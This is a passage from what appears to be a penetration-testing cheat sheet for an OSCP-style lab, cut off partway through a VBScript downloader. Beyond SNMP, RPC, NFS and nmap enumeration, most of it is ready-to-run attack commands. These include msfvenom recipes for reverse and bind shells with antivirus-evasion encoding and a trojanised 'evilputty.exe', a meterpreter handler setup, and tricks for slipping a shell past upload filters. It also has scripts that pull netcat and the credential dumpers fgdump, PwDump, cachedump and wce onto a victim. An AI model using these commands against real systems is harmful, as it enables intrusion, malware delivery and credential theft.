&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.4.2.1.2
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Enumerating Open TCP Ports:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Enumerating installed software:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Using &lt;code&gt;snmp-check&lt;&#x2F;code&gt; tool to see what is running on the system, network information, user information and etc: &lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;snmp-check -v1 -c public 10.1.1.13
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;rpc-bind-enumeration-port-135&quot;&gt;RPC Bind Enumeration (Port 135)&lt;&#x2F;h2&gt;
&lt;p&gt;List all RPC shares:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;rpcinfo -p 10.11.1.209
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;RPC Nmap script:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;nmap -v -p 111,845 --script=rpcinfo 10.11.1.8
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;nfs-enumeration&quot;&gt;NFS Enumeration&lt;&#x2F;h2&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;sudo mount -t nfs 10.10.10.180:&#x2F; .&#x2F;nfs&#x2F; -nolock
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;sudo showmount -e 10.10.10.180
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;vulnerability-scanning&quot;&gt;Vulnerability Scanning&lt;&#x2F;h2&gt;
&lt;p&gt;Nmap scanning: &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&lt;&#x2F;p&gt;
&lt;p&gt;Nmap port 80 scanning:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;nmap -v -p 80 --script=http-vuln-cve2010-2861 10.11.1.210
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Nmap port 21 scanning:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;nmap -v -p 21 --script=ftp-anon.nse 10.11.1.1-254
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Nmap SMB scanning:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;nmap -v -p 139,445 --script=smb-security-mode 10.11.1.236
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;msfvenom-commands&quot;&gt;MSFVenom Commands&lt;&#x2F;h2&gt;
&lt;p&gt;List all payloads:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;msfvenom -l payloads
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Show all options for selected payload:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;msfvenom -p java&#x2F;jsp_shell_reverse_tcp --list-options
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Creating Windows bind shells:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;msfvenom -p windows&#x2F;shell_bind_tcp -f exe -o &amp;lt;Filename.exe&amp;gt; LPORT=&amp;lt;BindPort&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;msfvenom -p windows&#x2F;shell_bind_tcp -f dll -o &amp;lt;Filename.dll&amp;gt; LPORT=&amp;lt;BindPort&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Encoding a payload example:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST=10.0.0.40 LPORT=4444 -e x86&#x2F;shikata_ga_nai -f exe -o payload.exe
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST=10.0.0.5 LPORT=4444 -e x86&#x2F;shikata_ga_nai -i 3 -f exe -o payload.exe
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Remove bad characters example:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST=10.0.0.5 LPORT=4444 -b &amp;quot;\x00&amp;quot; -f exe -o payload.exe
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Example Creating executable payload using putty.exe as template:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST=10.0.0.5 LPORT=4444 -x putty.exe -f exe &amp;gt; evilputty.exe
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Output format options (-f):&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, vba, vba-exe, vbs, war
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Transform format options:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;msfconsole-commands&quot;&gt;MSFConsole Commands&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;spreadsecurity.github.io&#x2F;2016&#x2F;11&#x2F;17&#x2F;attack-simulation-from-no-access-to-domain-admin.html&quot;&gt;https:&#x2F;&#x2F;spreadsecurity.github.io&#x2F;2016&#x2F;11&#x2F;17&#x2F;attack-simulation-from-no-access-to-domain-admin.html&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Using &lt;code&gt;multi&#x2F;handler&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;1. use multi&#x2F;handler
&lt;&#x2F;span&gt;&lt;span&gt;2. set payload windows&#x2F;meterpreter&#x2F;reverse_tcp
&lt;&#x2F;span&gt;&lt;span&gt;3. set LHOST &amp;lt;Listening_IP&amp;gt; (for example set LHOST 192.168.5.55)
&lt;&#x2F;span&gt;&lt;span&gt;4. set LPORT &amp;lt;Listening_Port&amp;gt; (for example set LPORT 4444)
&lt;&#x2F;span&gt;&lt;span&gt;5. exploit
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;If the meterpreter session dies shortly after establishing the connection, try stablizing the connection by migrating to another process:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;set AUTORUNSCRIPT post&#x2F;windows&#x2F;manage&#x2F;migrate
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Or use another type of process thread:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;set exitfunc seh
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;set exitfunc thread
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;searchsploit-commands&quot;&gt;Searchsploit Commands&lt;&#x2F;h2&gt;
&lt;p&gt;Look for exploits using findings from Nmap scans:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;searchsploit -x --nmap full_tcp_nmap.xml
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;tips-and-tricks-for-file-transferring&quot;&gt;Tips and Tricks for File Transferring&lt;&#x2F;h2&gt;
&lt;p&gt;Can&#x27;t upload reverse shell due to file restrictions:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Content-Type —&amp;gt; Change the parameter in the request header using Burp, ZAP etc.&lt;&#x2F;li&gt;
&lt;li&gt;Put server executable extensions like &lt;code&gt;file.php5, file.shtml, file.asa, file.cert&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Changing letters to capital form &lt;code&gt;file.aSp&lt;&#x2F;code&gt; or &lt;code&gt;file.PHp3&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Using trailing spaces and&#x2F;or dots at the end of the filename like &lt;code&gt;file.asp… … . . .. .. , file.asp , file.asp.&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Use of semicolon after the forbidden extension and before the permitted extension example: file.asp;.jpg (Only in IIS 6 or prior)&lt;&#x2F;li&gt;
&lt;li&gt;Upload a file with 2 extensions &lt;code&gt;file.php.jpg&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Use of null character —&amp;gt; file.asp%00.jpg&lt;&#x2F;li&gt;
&lt;li&gt;Create a file with a forbidden extension —&amp;gt; &lt;code&gt;file.asp:.jpg or file.asp::$data&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Combination of the above&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;linux-file-transferring&quot;&gt;Linux File Transferring&lt;&#x2F;h2&gt;
&lt;p&gt;Quickly setup a ftp server:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;python -m pyftpdlib --directory .&#x2F; --port=21 --write
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Quickly setup a web server:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;python -m SimpleHTTPServer 80
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;windows-file-transferring&quot;&gt;Windows File Transferring&lt;&#x2F;h2&gt;
&lt;p&gt;Compressing directory or files using Powershell&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;$source = &amp;quot;C:\folder&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;$dest = &amp;quot;C:\compressed.zip&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;Add-Type -assembly &amp;quot;system.io.compression.filesystem&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;[io.compression.zipfile]::CreateFromDirectory($source,$dest)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Using Impacket, start SMB server by running &lt;code&gt;smbserver.py&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;python3 smbserver.py myshare &#x2F;tmp&#x2F;smbshare&#x2F; -smb2
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This will share &#x2F;tmp&#x2F;smbshare directory over SMB as &lt;code&gt;myshare&lt;&#x2F;code&gt;. You can also use Windows to mount the share as well.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;net use Z: \\&amp;lt;IP&amp;gt;\myshare
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Copy file to the &#x2F;tftp and grab it from Windows machine:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;atftpd --daemon --port 69 &#x2F;tftp
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Run on Windows machine:&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;tftp -i 10.11.0.219 get nc.exe
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Download files over FTP non-interactively:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bat&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bat &quot;&gt;&lt;code class=&quot;language-bat&quot; data-lang=&quot;bat&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; open &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;219 21&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; USER offsec&amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; ftp&amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; bin &amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; GET nc.exe &amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; bye &amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt; -v -n -s:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bat&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bat &quot;&gt;&lt;code class=&quot;language-bat&quot; data-lang=&quot;bat&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; open &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;219 21&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; USER anonymous&amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; ftp&amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; bin &amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; GET fgdump.exe &amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; GET cachedump.exe &amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; GET PwDump.exe &amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; GET servpw.exe &amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; bye &amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt; -v -n -s:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bat&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bat &quot;&gt;&lt;code class=&quot;language-bat&quot; data-lang=&quot;bat&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; open &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;219 21&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; USER anonymous&amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; ftp&amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; bin &amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; GET wce32.exe &amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;echo&lt;&#x2F;span&gt;&lt;span&gt; bye &amp;gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt; -v -n -s:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;ftp&lt;&#x2F;span&gt;&lt;span&gt;.txt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;VBScript that acts like wget:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;vb&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-vb &quot;&gt;&lt;code class=&quot;language-vb&quot; data-lang=&quot;vb&quot;&gt;&lt;span&gt;echo strUrl = WScript.Arguments.Item(0) &amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo StrFile = WScript.Arguments.Item(1) &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo Err.Clear &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo Set http = Nothing &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo Set http = CreateObject(&amp;quot;WinHttp.WinHttpRequest.5.1&amp;quot;) &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo If http Is Nothing Then Set http = CreateObject(&amp;quot;WinHttp.WinHttpRequest&amp;quot;) &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo If http Is Nothing Then Set http = CreateObject(&amp;quot;MSXML2.ServerXMLHTTP&amp;quot;) &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo If http Is Nothing Then Set http = CreateObject(&amp;quot;Microsoft.XMLHTTP&amp;quot;) &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo http.Open &amp;quot;GET&amp;quot;, strURL, False &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo http.Send &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo varByteArray = http.ResponseBody &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo Set http = Nothing &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo Set fs = CreateObject(&amp;quot;Scripting.FileSystemObject&amp;quot;) &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo Set ts = fs.CreateTextFile(StrFile, True) &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo strData = &amp;quot;&amp;quot; &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo strBuffer = &amp;quot;&amp;quot; &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo For lngCounter = 0 to UBound(varByteArray) &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &amp;gt;&amp;gt; wget.vbs
&lt;&#x2F;span&gt;&lt;span&gt;echo Next &amp;gt;&amp;gt; wget.vbs
